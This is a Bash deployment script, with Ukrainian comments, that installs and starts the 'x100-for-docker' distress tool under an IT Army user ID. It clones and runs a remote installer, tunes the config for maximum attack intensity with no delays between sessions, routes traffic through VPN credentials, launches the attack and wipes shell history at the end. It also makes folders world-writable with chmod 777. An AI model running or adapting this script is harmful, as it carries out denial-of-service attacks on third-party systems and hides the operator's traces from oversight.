#!/bin/bash
set -e  # зупиняти скрипт при помилках

USER_ID="$1"

if [ -z "$USER_ID" ]; then
    echo "❌ Помилка: потрібно вказати itArmyUserId як аргумент!"
    echo "   Приклад запуску: ./x100+p.sh 1978307442"
    exit 1
fi

# === Підготовка середовища ===
cd ~
apt update -y
rm -rf x100-for-docker
apt install -y git wget screen mc vnstat tmux sed unzip

# === VNSTAT: права та старт (без systemd) ===
mkdir -p /var/lib/vnstat
touch /var/lib/vnstat/vnstat.db
chmod -R 777 /var/lib/vnstat

service vnstat start
grep -qxF "/usr/sbin/vnstatd --daemon" ~/.bashrc || echo "/usr/sbin/vnstatd --daemon" >> ~/.bashrc

# === Клонування репозиторію ===
git clone https://github.com/TatoEb/adss-x100.git
cd adss-x100
chmod +x *.sh

# Копіюємо файли у $HOME
cd ~
cp ~/adss-x100/*.* ~
rm -rf x100-for-docker adss-x100

# === Запуск основного інсталятора ===
bash adss-x100.bash

# === Налаштування x100-config.txt ===
cd ~/x100-for-docker/put-your-ovpn-files-here/

sed -i -E "
  s/initialDistressScale=50/initialDistressScale=950/;
  s/delayAfterSessionMinDuration=15/delayAfterSessionMinDuration=0/;
  s/delayAfterSessionMaxDuration=45/delayAfterSessionMaxDuration=2/;
  s/itArmyUserId=77777777/itArmyUserId=${USER_ID}/;
  s/fixedVpnConnectionsQuantity=0/fixedVpnConnectionsQuantity=7/;
  s/networkUsageGoal=80%/networkUsageGoal=725/;
  s/oneSessionMinDuration=600/oneSessionMinDuration=400/;
  s/oneSessionMaxDuration=900/oneSessionMaxDuration=700/;
" x100-config.txt

chmod -R 777 ~/x100-for-docker

# === Видалення зайвого ===
cd ~
./no-free.sh
rm -rf adss-x100.bash no-free.sh run.sh bac.sh res.sh InstallX100.sh README.md

# === Робота з OVPN ===
cp ovpn.zip ~/x100-for-docker/put-your-ovpn-files-here
rm -f ovpn.zip
cd ~/x100-for-docker/put-your-ovpn-files-here
unzip -qq ovpn.zip
rm -f ovpn.zip

# === Введення credential'ів ===
cd ~/x100-for-docker/put-your-ovpn-files-here/P-do
mcedit credentials.txt
cd ~/x100-for-docker/put-your-ovpn-files-here/H.me
mcedit credentials.txt

# === Запуск атаки ===
clear
cd
./X100.sh

# === Очищення історії ===
history -c
history -w
history -c
